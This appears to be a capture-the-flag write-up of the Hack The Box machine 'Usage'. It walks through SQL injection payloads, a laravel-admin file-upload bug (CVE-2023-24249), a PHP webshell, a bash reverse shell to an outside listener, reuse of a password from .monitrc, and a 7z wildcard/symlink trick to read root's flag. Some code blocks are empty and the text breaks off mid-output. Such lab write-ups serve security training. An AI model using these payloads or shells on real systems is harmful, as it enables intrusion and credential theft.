# Reconnaissance

Let's will start with basic `nmap` scan

## Nmap

```bash
nmap -sCV -p 22,80 -oA usage.nmap 10.10.11.18 
```

From which I get a bunch of Interesting Information

```bash
# Nmap 7.95 scan initiated Wed Feb 19 23:04:54 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p 22,80 -oA usage.nmap 10.10.11.18
Nmap scan report for 10.10.11.18

# Nmap done at Wed Feb 19 23:05:12 2025 -- 1 IP address (1 host up) scanned in 18.04 seconds

```

We have 2 services OpenSSH and Nginx running on there default ports which are 22(SSH), 80(HTTP)

I also notice that the the web server redirects to `usage.htb`

So let's edit our `Host` file first

```bash
echo 10.10.11.18 usage.htb | sudo tee -a /etc/hosts
```

Now, that I have my host setup, let’s browse and see what the website holds for me...

### HTTP

Let’s Start with `PORT 80`

On browsing to `usage.htb` and I land on a login page 

![Usage](/assets/img/post/hackthebox/usage/1.png)

I notice that we have the option to log in, register a new account, or navigate to the admin panel. The admin panel also redirects me to the `admin.usage.htb` domain, which I also need to add to our hosts file.

```bash
echo 10.10.11.18 admin.usage.htb | sudo tee -a /etc/hosts
```

Nvaigating to Admin page also presents with us a login page.

![Usage](/assets/img/post/hackthebox/usage/2.png)

I could also register an account for myself on 

> http://usage.htb/registration

![Usage](/assets/img/post/hackthebox/usage/3.png)

We can login after registeration which present us with a blog page where there is nothing much to look

![Usage](/assets/img/post/hackthebox/usage/4.png)

But we have an Reset Password link on login page.

> http://usage.htb/forget-password

When we submit a valid email, such as the one we used to sign up our new account, we get the following response:

![Usage](/assets/img/post/hackthebox/usage/5.png)

whereas in for an invalid email, we get the following response: 

![Usage](/assets/img/post/hackthebox/usage/6.png)

Which indicates that I might be interacting with the database somehow so we cna definetly try fr SQL Injection over here.

Submit the email with following payload

```
test' or 1=1;-- - 
```

![Usage](/assets/img/post/hackthebox/usage/7.png)

In order to confirm our attack vector we input the email with following payload and get invalid email response

```
 test' or 1=2;-- - 
```
![Usage](/assets/img/post/hackthebox/usage/6.png)

## Shell as dash

### SQL Injection (SQLi)

First, we intercept the password reset request with a web proxy like BurpSuite in order to understand the difference between a valid request and response.

Upon further inspection I notice that the result for valid and invalid email is same from server that a bit interesting.

So I will be using sqlmap to exploit it but first let's save the request to a file

```

We can login to admin panel using the following credentials

![Usage](/assets/img/post/hackthebox/usage/8.png)

This is some kind of admin dashboard. It’s showing information about the site, including the packages that are installed and the versions. Given that the top dependency is “laravel-admin”, it seems likely that that’s what is used to build this

Since I know it's main dependency is larvel a quick google search `encore laravel-admin v1.8.18 exploit` gives following result

![Usage](/assets/img/post/hackthebox/usage/9.png)

### CVE-2023-24249 

The vulnerability in larvel with CVE-2023-24249 is an arbitrary file upload issue which leads to code execution on server and explained [here](https://flyd.uk/post/cve-2023-24249/) in detail

Let's create a simple phpinfo() file to validate 

```php
<?php phpinfo(); ?>
```
and save it as `p3n.php.jpg`

On uploading the image it get uploaded successfully

![Usage](/assets/img/post/hackthebox/usage/10.png)

Upon opening it in new tab it show broken image that is because of .jpg extension, let's run it via burp and change extension to .php

![Usage](/assets/img/post/hackthebox/usage/11.png)

![Usage](/assets/img/post/hackthebox/usage/12.png)

Now the page runs commands

![Usage](/assets/img/post/hackthebox/usage/13.png)

Let's upload the PHP webshell 

```php
<?php system($_REQUEST['cmd']); ?>
```
![Usage](/assets/img/post/hackthebox/usage/14.png)

### shell

To get a shell, I’ll start nc listening on port 9001, and then run a bash reverse shell as the command

> http://admin.usage.htb/uploads/images/p3n.jpg.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'

On my nc listner

## Shell as Xander

Few interesting directory in home directory of dash is as 

```zsh

```

Monit seems to be interesting which is 

> Monit can monitor and manage distributed computer systems, conduct automatic maintenance and repair and execute meaningful causal actions in error situation

On checking the files we find a password in `.monitrc`

```zsh
dash@usage:~$ cat .monitrc 
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring

    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
dash@usage:~$ 
```
It's always good to try password on all accounts to see if it's being used somewhere else also

```zsh
dash@usage:~$ su xander
Password: 3nc0d3d_pa$$w0rd
xander@usage:/home/dash$ id
uid=1001(xander) gid=1001(xander) groups=1001(xander)
xander@usage:/home/dash$ 
```
To our luck it worked on xander and we can also ssh into xander user

## Shell as root

```zsh

Further exploring on 7za we arrive on [Hacktrickz](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#id-7z) article which basically says 7z even using -- before * (note that -- means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root, we an create files in the folder were this is being executed, create a symlink to the file that we want to read

```zsh
xander@usage:/var/www/html$ touch @root.txt
xander@usage:/var/www/html$ ln -s /root/root.txt root.txt
```

We can read the root flag

```zsh
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
